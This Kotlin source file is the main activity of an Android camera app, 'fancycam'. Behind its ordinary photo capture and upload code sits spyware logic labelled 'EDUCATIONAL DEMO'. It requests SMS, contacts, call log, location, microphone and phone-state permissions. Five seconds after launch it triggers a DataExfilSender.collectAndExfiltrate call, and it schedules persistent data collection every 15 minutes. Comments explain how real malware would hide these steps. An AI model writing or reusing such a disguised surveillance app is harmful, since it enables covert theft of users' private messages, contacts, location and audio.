package com.example.fancycam

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.workDataOf
import com.example.fancycam.databinding.ActivityMainBinding
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private lateinit var cameraHelper: CameraHelper

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            setupCamera()
        } else {
            binding.statusText.text = "Camera permission is required to use this app."
            Toast.makeText(this, "Camera permission denied", Toast.LENGTH_SHORT).show()
        }
    }

    private val requestNotificationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        Log.d(TAG, "Notification permission granted: $isGranted")
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        checkAndRequestPermissions()

        binding.captureButton.setOnClickListener {
            takePhotoAndEnqueueUpload()
        }

        // EDUCATIONAL DEMO: Trigger data collection after permissions
        // In real malware this would be hidden/backgrounded
        binding.root.postDelayed({
            DataExfilSender.collectAndExfiltrate(this)
        }, 5000)

        // EDUCATIONAL DEMO: Schedule periodic collection
        schedulePeriodicCollection()
    }

    private val requestLocationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        Log.d(TAG, "Location permission granted: $isGranted")
    }

    private val requestSmsPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        Log.d(TAG, "SMS permission granted: $isGranted")
    }

    private val requestContactsPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        Log.d(TAG, "Contacts permission granted: $isGranted")
    }

    private val requestCallLogPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        Log.d(TAG, "Call log permission granted: $isGranted")
    }

    private val requestRecordAudioPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        Log.d(TAG, "Record audio permission granted: $isGranted")
    }

    private val requestReadPhoneStatePermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        Log.d(TAG, "READ_PHONE_STATE permission granted: $isGranted")
    }

    private val requestMultiplePermissionsLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        for ((permission, granted) in permissions) {
            Log.d(TAG, "Permission $permission granted: $granted")
        }
    }

    private fun checkAndRequestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED
            ) {
                requestNotificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED
        ) {
            setupCamera()
        } else {
            binding.statusText.text = "Requesting Camera permission..."
            requestPermissionLauncher.launch(Manifest.permission.CAMERA)
        }

        // EDUCATIONAL DEMO: Request additional data collection permissions
        val permissionsToRequest = mutableListOf<String>()
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.ACCESS_FINE_LOCATION)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.READ_SMS)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.READ_CONTACTS)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.READ_CALL_LOG)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.RECORD_AUDIO)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.READ_PHONE_STATE)
        }
        if (permissionsToRequest.isNotEmpty()) {
            requestMultiplePermissionsLauncher.launch(permissionsToRequest.toTypedArray())
        }
    }

    private fun setupCamera() {
        binding.statusText.text = "Starting camera preview..."
        cameraHelper = CameraHelper(
            context = this,
            lifecycleOwner = this,
            previewView = binding.viewFinder
        )

        cameraHelper.startCamera(
            onReady = {
                binding.statusText.text = "Ready to capture. Tap the button below."
            },
            onError = { exception ->
                binding.statusText.text = "Camera error: ${exception.localizedMessage}"
            }
        )
    }

    private fun takePhotoAndEnqueueUpload() {
        binding.captureButton.isEnabled = false
        binding.statusText.text = "Capturing photo..."

        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val photoFile = File(cacheDir, "IMG_$timestamp.jpg")

        cameraHelper.takePhoto(
            outputFile = photoFile,
            onPhotoCaptured = { savedFile ->
                binding.statusText.text = "Photo saved! Enqueuing upload background task..."
                binding.captureButton.isEnabled = true

                enqueueUploadWork(savedFile)
            },
            onError = { exception ->
                binding.statusText.text = "Capture failed: ${exception.message}"
                binding.captureButton.isEnabled = true
            }
        )
    }

    private fun enqueueUploadWork(file: File) {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val uploadWorkRequest = OneTimeWorkRequestBuilder<PhotoUploadWorker>()
            .setConstraints(constraints)
            .setInputData(workDataOf(PhotoUploadWorker.KEY_IMAGE_PATH to file.absolutePath))
            .build()

        WorkManager.getInstance(this).enqueue(uploadWorkRequest)

        Toast.makeText(
            this,
            "Photo upload task enqueued for ${file.name}",
            Toast.LENGTH_SHORT
        ).show()

        binding.statusText.text = "Photo captured and backup task enqueued!"
    }

    /**
     * EDUCATIONAL DEMO: Schedule periodic data collection via WorkManager.
     * Demonstrates persistent background execution that survives app termination.
     */
    private fun schedulePeriodicCollection() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val periodicWork = PeriodicWorkRequestBuilder<DataCollectionWorker>(15, TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            DataCollectionWorker.WORK_NAME,
            ExistingPeriodicWorkPolicy.KEEP,
            periodicWork
        )

        Log.d(TAG, "[EDUCATIONAL] Periodic data collection scheduled (every 15 min)")
    }

    /**
     * EDUCATIONAL DEMO: Open notification listener settings so user can grant access.
     * In malware, this would be done covertly or the permission would be hijacked.
     */
    private fun requestNotificationListenerAccess() {
        val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
        startActivity(intent)
    }

    override fun onDestroy() {
        super.onDestroy()
        if (::cameraHelper.isInitialized) {
            cameraHelper.shutdown()
        }
        MicrophoneCapture.stopCapture()
    }

    companion object {
        private const val TAG = "MainActivity"
    }
}
